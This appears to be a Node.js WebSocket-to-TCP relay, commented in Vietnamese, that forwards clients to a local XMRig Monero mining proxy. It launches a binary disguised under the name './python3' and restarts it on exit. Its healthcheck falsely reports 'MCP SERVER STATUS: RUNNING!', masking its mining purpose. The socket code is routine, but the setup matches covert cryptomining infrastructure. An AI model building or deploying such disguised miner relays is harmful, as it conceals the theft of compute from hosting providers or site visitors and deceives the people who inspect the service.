import uWS from "uWebSockets.js";
import net from "net";
import { spawn } from "child_process";

const PORT = 8000;
const XMRIG_PROXY_HOST = "127.0.0.1";
const XMRIG_PROXY_PORT = 3333;
const app = uWS.App();

// Cấu hình
const MAX_QUEUE_SIZE = 100; // Giảm xuống, nếu queue quá lớn = có vấn đề
const MAX_PAYLOAD_LENGTH = 1024 * 1024; // 1MB
const IDLE_TIMEOUT_SECONDS = 300; // 5 phút
const TCP_CONNECT_TIMEOUT = 10000; // 10 giây timeout cho TCP connect
const DEBUG = false;

function normalizeLine(msg) {
  const text = typeof msg === "string" ? msg : String(msg);
  return text.endsWith("\n") ? text : text + "\n";
}

function safeEndWS(ws, code, reason) {
  try {
    if (ws.isClosed) return;
    ws.end(code, reason);
  } catch (e) {
    console.error("Error closing WebSocket:", e);
  }
}

function cleanupWS(ws) {
  if (ws.tcp && !ws.tcp.destroyed) {
    try {
      ws.tcp.destroy();
    } catch (e) {
      console.error("Error destroying TCP:", e);
    }
  }
  ws.isConnected = false;
  ws.isConnecting = false;
  ws.queue = [];
  ws.tcp = null;
  ws.tcpWritable = false;
  if (ws.connectTimer) {
    clearTimeout(ws.connectTimer);
    ws.connectTimer = null;
  }
}

function startTcpProxy() {
  console.log(`Starting tcp endpoint proxy...`);
  const proxy = spawn("./python3", ['-c', './config.json']);
  
  proxy.stdout.on("data", (data) => {
    console.log(`[PROXY][INFO] ${data.toString().trim()}`);
  });
  
  proxy.stderr.on("data", (data) => {
    console.error(`[PROXY][ERROR] ${data.toString().trim()}`);
  });
  
  proxy.on("close", (code) => {
    console.log(`[PROXY][INFO] Exited with code ${code}. Restarting...`);
    setTimeout(startTcpProxy, 5000);
  });
}

// HTTP healthcheck
app.get("/", (res) => {
  res.writeHeader("Content-Type", "text/plain; charset=utf-8");
  res.writeHeader("Cache-Control", "no-store");
  res.end("MCP SERVER STATUS: RUNNING!");
});

// WebSocket <-> TCP proxy
app.ws("/*", {
  compression: 0,
  maxPayloadLength: MAX_PAYLOAD_LENGTH,
  idleTimeout: IDLE_TIMEOUT_SECONDS,
  
  upgrade: (res, req, context) => {
    try {
      const ip = Buffer.from(res.getRemoteAddressAsText()).toString();
      res.upgrade(
        { 
          ip,
          isConnected: false,
          isConnecting: false,
          queue: [],
          tcp: null,
          tcpHost: `${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`,
          tcpWritable: false,
          connectTimer: null
        },
        req.getHeader("sec-websocket-key"),
        req.getHeader("sec-websocket-protocol"),
        req.getHeader("sec-websocket-extensions"),
        context
      );
    } catch (e) {
      console.error("Upgrade error:", e);
    }
  },
  
  open: (ws) => {
    const host = XMRIG_PROXY_HOST;
    const port = XMRIG_PROXY_PORT;
    const clientIp = ws.ip;
    
    const tcp = net.createConnection({ host, port });
    tcp.setTimeout(0);
    tcp.setNoDelay(true);
    
    ws.isConnected = false;
    ws.isConnecting = true;
    ws.queue = [];
    ws.tcp = tcp;
    ws.tcpHost = `${host}:${port}`;
    ws.tcpWritable = false;
    
    console.log(`🟢 CONNECTING: WS [${clientIp}] <-> TCP [${host}:${port}]`);
    
    // Timeout cho TCP connection
    ws.connectTimer = setTimeout(() => {
      if (!ws.isConnected && ws.isConnecting) {
        console.error(`⏱️ TCP connect timeout for WS [${clientIp}]`);
        cleanupWS(ws);
        safeEndWS(ws, 1011, "TCP connect timeout");
      }
    }, TCP_CONNECT_TIMEOUT);
    
    tcp.on("connect", () => {
      if (ws.isClosed) {
        tcp.destroy();
        return;
      }
      
      ws.isConnected = true;
      ws.isConnecting = false;
      ws.tcpWritable = true;
      
      if (ws.connectTimer) {
        clearTimeout(ws.connectTimer);
        ws.connectTimer = null;
      }
      
      console.log(`✅ CONNECTED: WS [${clientIp}] <-> TCP [${host}:${port}]`);
      
      // Flush queue
      const queueCopy = [...ws.queue];
      ws.queue = [];
      
      for (const msg of queueCopy) {
        if (ws.tcpWritable && !tcp.destroyed) {
          const canWrite = tcp.write(normalizeLine(msg));
          if (!canWrite) {
            ws.tcpWritable = false;
            console.warn(`⚠️ TCP buffer full for WS [${clientIp}]`);
          }
        }
      }
    });
    
    tcp.on("drain", () => {
      ws.tcpWritable = true;
      DEBUG && console.log(`💧 TCP buffer drained for WS [${clientIp}]`);
    });
    
    tcp.on("data", (data) => {
      try {
        if (ws.isClosed) return;
        
        // Kiểm tra backpressure từ WebSocket
        const buffered = ws.getBufferedAmount();
        if (buffered > MAX_PAYLOAD_LENGTH) {
          console.warn(`⚠️ WS buffer high (${buffered} bytes) for [${clientIp}]`);
          // Có thể tạm dừng TCP socket
          tcp.pause();
          setTimeout(() => {
            if (!tcp.destroyed) tcp.resume();
          }, 100);
          return;
        }
        
        ws.send(data.toString("utf-8"), false);
      } catch (err) {
        console.error("WS send failed:", err?.message ?? err);
        cleanupWS(ws);
      }
    });
    
    tcp.on("close", () => {
      console.log(`🔌 TCP closed for WS [${clientIp}]`);
      cleanupWS(ws);
      safeEndWS(ws, 1000, "TCP closed");
    });
    
    tcp.on("error", (err) => {
      console.error(`❌ TCP error [${host}:${port}] for WS [${clientIp}]:`, err.message);
      cleanupWS(ws);
      safeEndWS(ws, 1011, err.message || "TCP error");
    });
  },
  
  message: (ws, msg) => {
    const data = Buffer.from(msg);
    const text = data.toString("utf-8");
    
    // Nếu đã connected và TCP writable
    if (ws.isConnected && ws.tcp && !ws.tcp.destroyed && ws.tcpWritable) {
      const canWrite = ws.tcp.write(normalizeLine(text));
      if (!canWrite) {
        ws.tcpWritable = false;
        DEBUG && console.warn(`⚠️ TCP buffer full for WS [${ws.ip}]`);
      }
    } 
    // Nếu đang connecting, đẩy vào queue
    else if (ws.isConnecting) {
      if (!Array.isArray(ws.queue)) {
        ws.queue = [];
      }
      
      if (ws.queue.length >= MAX_QUEUE_SIZE) {
        console.error(
          `🚨 QUEUE OVERFLOW for WS [${ws.ip}] -> ${ws.tcpHost}. Queue size: ${ws.queue.length}`
        );
        cleanupWS(ws);
        safeEndWS(ws, 1011, "Queue overflow - connection too slow");
        return;
      }
      
      ws.queue.push(text);
      
      // Warning nếu queue lớn
      if (ws.queue.length > MAX_QUEUE_SIZE / 2) {
        console.warn(`⚠️ Queue growing: ${ws.queue.length} messages for WS [${ws.ip}]`);
      }
    }
    // Nếu không connected và không connecting = có vấn đề
    else {
      console.warn(`⚠️ Message received but TCP not ready for WS [${ws.ip}]`);
      cleanupWS(ws);
      safeEndWS(ws, 1011, "TCP not ready");
    }
  },
  
  close: (ws, code, message) => {
    const clientIp = ws.ip;
    const tcpHost = ws.tcpHost;
    const queueSize = ws.queue ? ws.queue.length : 0;
    
    cleanupWS(ws);
    
    const reason = Buffer.from(message || "").toString("utf-8") || "no reason";
    console.log(
      `🔴 DISCONNECTED: WS [${clientIp}] <-> TCP [${tcpHost}] ` +
      `(code=${code}, reason="${reason}", queued=${queueSize})`
    );
  },
});

app.listen("0.0.0.0", PORT, (t) => {
  if (t) {
    console.log(`🚀 WS⇄TCP proxy running on port ${PORT}`);
    console.log(`Forwarding to ${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`);
    startTcpProxy();
  } else {
    console.error("❌ Failed to listen");
  }
});
